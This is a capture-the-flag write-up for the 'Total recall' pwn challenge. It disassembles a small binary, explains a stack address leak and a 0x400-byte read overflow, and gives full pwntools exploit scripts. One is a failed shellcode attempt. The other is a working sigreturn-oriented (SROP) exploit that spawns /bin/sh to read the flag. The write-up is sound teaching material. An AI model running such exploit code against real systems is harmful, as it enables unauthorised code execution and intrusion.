<img width="577" height="263" alt="Pasted image 20260929120228" src="https://github.com/user-attachments/assets/9e3b8f54-8afe-4a0e-bc0e-8846e3cb1602" />
<img width="577" height="263" alt="Pasted image 20260929120228" src="https://github.com/user-attachments/assets/01d5ad49-742a-45a0-bc8f-82cc8cbf30a2" />
<img width="2071" height="1157" alt="Screenshot_20260929-115758" src="https://github.com/user-attachments/assets/abdeeb1f-5676-4831-8294-0c705058a070" />
# Total recall

## Assignment
Can you recall how to get out of this one?

Files:

- [total_recall](https://sunshinectf.games/files/54cf6a/total_recall)

`nc chal.sunshinectf.games 26003`

## Analysis

First, I analyzed the provided binary using the `file` command:

`file total_recall
`total_recall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped

Next, I used `objdump` to extract and inspect the assembly code:

`objdump -d -M intel ./total_recall

```
./total_recall:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:	e8 11 00 00 00       	call   0x401016
  401005:	e8 45 00 00 00       	call   0x40104f
  40100a:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  401011:	48 31 ff             	xor    rdi,rdi
  401014:	0f 05                	syscall
  401016:	54                   	push   rsp
  401017:	48 89 e6             	mov    rsi,rsp
  40101a:	48 c7 c7 01 00 00 00 	mov    rdi,0x1
  401021:	48 c7 c2 08 00 00 00 	mov    rdx,0x8
  401028:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  40102f:	0f 05                	syscall
  401031:	58                   	pop    rax
  401032:	48 8d 74 24 c0       	lea    rsi,[rsp-0x40]
  401037:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
  40103e:	48 c7 c2 18 00 00 00 	mov    rdx,0x18
  401045:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  40104c:	0f 05                	syscall
  40104e:	c3                   	ret
  40104f:	48 8d 74 24 80       	lea    rsi,[rsp-0x80]
  401054:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
  40105b:	48 c7 c2 00 04 00 00 	mov    rdx,0x400
  401062:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  401069:	0f 05                	syscall
  40106b:	c3                   	ret
```


From this, we can see that the binary contains a stack-based buffer overflow. The first part of the code leaks a stack address, while the second function reads up to `0x400` (1024) bytes into a buffer located at `RSP - 0x80`. This allows us to overwrite data beyond the buffer, including the saved return address.

We can also see that the program leaks a stack address derived from `RSP`. This happens because `RSP` is pushed onto the stack and then `RSI` is set to point to the value stored there. The following `write` syscall sends these 8 bytes to `stdout`. This gives us a stack address that we can use to calculate the address of the vulnerable buffer. The relevant instructions are:
```
  401016:	54                   	push   rsp
  401017:	48 89 e6             	mov    rsi,rsp
  40101a:	48 c7 c7 01 00 00 00 	mov    rdi,0x1
  401021:	48 c7 c2 08 00 00 00 	mov    rdx,0x8
  401028:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  40102f:	0f 05                	syscall
```

First, I tried to exploit the vulnerability using a simple stack overflow. I used the leaked stack address to calculate the address of my shellcode and then overwrote the saved return address with this address. I first sent 24 `A` characters to satisfy the first read call. I then placed the shellcode at the beginning of the vulnerable buffer, padded the payload to `0x80` bytes, and overwrote the saved return address with the address of the shellcode. My goal was to execute `/bin/ls`.

However, after running the exploit, I found that it did not work.

![[Pasted image 20260928230752.png]]

Code:
``` python
from pwn import *

p = remote('chal.sunshinectf.games', 26003)

leaked_bytes = p.recvn(8)
leak = u64(leaked_bytes)
log.success(f"Leaked address: {hex(leak)}")

shellcode_addr = leak - 0x80 

log.info(f"Target address: {hex(shellcode_addr)}")

p.send(b"A" * 24)
time.sleep(0.5)
shellcode = asm(
    shellcraft.execve("/bin/ls", ["/bin/ls"], 0)
)
payload = shellcode.ljust(0x80, b"A")
payload += p64(shellcode_addr)

assert len(payload) == 0x88


p.send(payload)
```

I try to figure out why, and SROP comes to my mind. In this attack, the attacker uses the `rt_sigreturn` syscall for exploitation. This is possible because I can use syscalls and also have control over the stack through the stack overflow.

Because I control the saved return address on the stack, I overwrite it with `0x40104f`. This causes the vulnerable `read` function to be executed again when the function returns. I also use the higher addresses to add `0x401069` and the FRAME. The principle can be seen in the picture.

![[Screenshot_20260929-115758.png]]

Based on the syscall table, we know that `execve` is number 59 ([Linux syscall table](https://filippo.io/linux-syscall-table/)). To enter the payload properly, we first need to add padding to overflow the buffer, which is `b'A' * 0x80`. Then we add the address for the second read. This is because we need to put the number 15 into `RAX`, and we can do this by sending 15 bytes. Then we add the address of the `syscall` instruction, in our case `0x401069`. After that, we add the frame. To create it, we use the `SigreturnFrame` class from the pwntools library.

We will set the registers to the following values:
``` python
frame.rax = 59 # number of execve
frame.rdi = binsh # address of /bin/sh, in our case buf + 0x200
frame.rsi = argv # address of argv, in our case buf + 0x280 
frame.rdx = 0
frame.rip = 0x401069 # address of the syscall instruction used for execve (Since I control the registers restored by the SigreturnFrame, I can set RIP to any suitable syscall instruction.)
frame.rsp = buf + 0x500 # address of the stack to continue from 
```
 

I choose to use some padding to make it easier for me to read in the code (e.g. `buf + 0x200`, `buf + 0x280`, etc.).

After creating the frame, I construct the payload by adding the padding and the addresses (The payload is written sequentially to higher memory addresses).

To make the exploit work, I also need to send 15 bytes after this payload. This makes the second `read` return 15, which sets `RAX` to 15. Then the `syscall` at `0x401069` executes `rt_sigreturn`, and the kernel uses the `SigreturnFrame` to restore the registers.

Code:
```python
from pwn import *
import time

context.binary = './total_recall'


p = remote('chal.sunshinectf.games', 26003)

# 1. leak stack
# -------------------------------------------------

leak = u64(p.recvn(8))
buf = leak - 0x80

log.info(f"leak = {leak:#x}")

# 2. structure of data on stack
# -------------------------------------------------

binsh = buf + 0x200
dashc = buf + 0x210
cmd   = buf + 0x220
argv  = buf + 0x280

# 3. SROP frame
# execve("/bin/sh", ["/bin/sh", "-c", CMD], NULL)
# -------------------------------------------------

frame = SigreturnFrame()

frame.rax = 59
frame.rdi = binsh
frame.rsi = argv
frame.rdx = 0
frame.rip = 0x401069
frame.rsp = buf + 0x500

payload = (
    b'A' * 0x80 +
    p64(0x40104f) +
    p64(0x401069) +
    bytes(frame)
)

# 3.1 /bin/sh
# -------------------------------------------------

payload += b'A' * (0x200 - len(payload))
payload += b'/bin/sh\x00'


# 3.2 "-c"
# -------------------------------------------------

payload += b'A' * (0x210 - len(payload))
payload += b'-c\x00'


# 3.3 command
# -------------------------------------------------

payload += b'A' * (0x220 - len(payload))
payload += b'ls -la; cat flag\x00'


# 3.4 argv
#
# argv[0] = /bin/sh
# argv[1] = -c
# argv[2] = command
# argv[3] = NULL
# -------------------------------------------------

payload += b'A' * (0x280 - len(payload))
payload += p64(binsh)
payload += p64(dashc)
payload += p64(cmd)
payload += p64(0)

assert len(payload) <= 0x400

log.info(f"payload = {len(payload)} bytes")

# 8. first read
# -------------------------------------------------

p.send(b'A' * 24)

sleep(0.2)


# 9. overflow + SROP frame
# -------------------------------------------------

p.send(payload)

sleep(0.2)


# 10. second read to set RAX to 15
# -------------------------------------------------

p.send(b'B' * 15)

data = p.recvrepeat(3)

print()
print(data.decode(errors='replace'))
p.close()
```

After running the code, I received this output:
![[Pasted image 20260929114432.png]]

When I fixed the name of the file, I was able to obtain the flag.
![[Pasted image 20260929120228.png]]
